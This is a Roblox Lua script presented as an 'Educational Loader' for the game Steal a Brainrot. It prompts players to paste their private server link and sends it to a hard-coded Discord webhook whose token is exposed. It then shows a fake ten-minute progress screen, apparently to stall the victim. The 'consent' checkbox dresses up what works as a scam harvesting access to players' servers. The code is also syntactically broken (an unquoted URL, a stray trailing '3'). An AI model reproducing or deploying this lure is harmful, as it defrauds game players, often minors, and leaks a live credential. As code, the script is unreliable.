-- Steal a Brainrot | Educational Loader
-- Consent-based Discord webhook
-- Fullscreen 0–100% (10 minutes)

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")
local player = Players.LocalPlayer

-- 🔴 ӨӨРӨӨ ЭНД WEBHOOK-ОО PASTE ХИЙ 🔴
local WEBHOOK_URL = https://discord.com/api/webhooks/1459228691719524423/2wshWHQe64lNdZ3IuwAEOVni6bLXiKmlQ_tIeorJOylviHrJk5cWtMGVVDGX58N-eApn"

-- ===== GUI =====
local gui = Instance.new("ScreenGui", player.PlayerGui)
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.fromScale(0.65, 0.4)
frame.Position = UDim2.fromScale(0.5, 0.5)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,14)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -20, 0, 50)
title.Position = UDim2.new(0, 10, 0, 10)
title.BackgroundTransparency = 1
title.Text = "Private Server Link Required"
title.TextColor3 = Color3.new(1,1,1)
title.TextScaled = true
title.Font = Enum.Font.GothamBold

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(1, -20, 0, 45)
box.Position = UDim2.new(0, 10, 0, 70)
box.PlaceholderText = "Paste private server link here"
box.Text = ""
box.ClearTextOnFocus = false
box.TextColor3 = Color3.new(1,1,1)
box.BackgroundColor3 = Color3.fromRGB(35,35,35)
box.Font = Enum.Font.Gotham
box.TextScaled = true
Instance.new("UICorner", box).CornerRadius = UDim.new(0,10)

-- Consent checkbox
local consent = Instance.new("TextButton", frame)
consent.Size = UDim2.new(1, -20, 0, 35)
consent.Position = UDim2.new(0, 10, 0, 125)
consent.Text = "[ ] I agree to send this link to Discord"
consent.TextColor3 = Color3.new(1,1,1)
consent.BackgroundColor3 = Color3.fromRGB(30,30,30)
consent.Font = Enum.Font.Gotham
consent.TextScaled = true
Instance.new("UICorner", consent).CornerRadius = UDim.new(0,8)

local agreed = false
consent.MouseButton1Click:Connect(function()
    agreed = not agreed
    consent.Text = agreed
        and "[✓] I agree to send this link to Discord"
        or "[ ] I agree to send this link to Discord"
end)

local submit = Instance.new("TextButton", frame)
submit.Size = UDim2.new(0.45, -10, 0, 40)
submit.Position = UDim2.new(0.05, 0, 1, -50)
submit.Text = "Submit"
submit.BackgroundColor3 = Color3.fromRGB(0,170,255)
submit.TextColor3 = Color3.new(1,1,1)
submit.Font = Enum.Font.GothamBold
submit.TextScaled = true
Instance.new("UICorner", submit).CornerRadius = UDim.new(0,10)

local cancel = Instance.new("TextButton", frame)
cancel.Size = UDim2.new(0.45, -10, 0, 40)
cancel.Position = UDim2.new(0.5, 0, 1, -50)
cancel.Text = "Cancel"
cancel.BackgroundColor3 = Color3.fromRGB(200,60,60)
cancel.TextColor3 = Color3.new(1,1,1)
cancel.Font = Enum.Font.GothamBold
cancel.TextScaled = true
Instance.new("UICorner", cancel).CornerRadius = UDim.new(0,10)

-- ===== FULLSCREEN PROGRESS =====
local full = Instance.new("Frame", gui)
full.Visible = false
full.Size = UDim2.fromScale(1,1)
full.BackgroundColor3 = Color3.fromRGB(10,10,10)

local label = Instance.new("TextLabel", full)
label.Size = UDim2.fromScale(1,0.2)
label.Position = UDim2.fromScale(0,0.4)
label.BackgroundTransparency = 1
label.Text = "0%"
label.TextColor3 = Color3.new(1,1,1)
label.Font = Enum.Font.GothamBold
label.TextScaled = true

local barBG = Instance.new("Frame", full)
barBG.Size = UDim2.fromScale(0.8,0.04)
barBG.Position = UDim2.fromScale(0.1,0.6)
barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
Instance.new("UICorner", barBG).CornerRadius = UDim.new(1,0)

local bar = Instance.new("Frame", barBG)
bar.Size = UDim2.fromScale(0,1)
bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)

-- ===== Functions =====
local function sendWebhook(link)
    if not agreed or WEBHOOK_URL == "" then return end
    local data = {
        content = "Private Server Link:\n" .. link
    }
    pcall(function()
        HttpService:PostAsync(
            WEBHOOK_URL,
            HttpService:JSONEncode(data),
            Enum.HttpContentType.ApplicationJson
        )
    end)
end

local function startProgress()
    pcall(function()
        SoundService.Volume = 0.3
    end)
    local duration = 600
    for i = 1, 100 do
        label.Text = i .. "%"
        bar.Size = UDim2.fromScale(i/100, 1)
        task.wait(duration/100)
    end
    label.Text = "Completed"
end

-- ===== Button connections =====
submit.MouseButton1Click:Connect(function()
    if box.Text == "" then return end
    sendWebhook(box.Text) -- зөвшөөрөлтэй webhook илгээх
    frame.Visible = false
    full.Visible = true
    task.spawn(startProgress)
end)

cancel.MouseButton1Click:Connect(function()
    gui:Destroy()
end)3
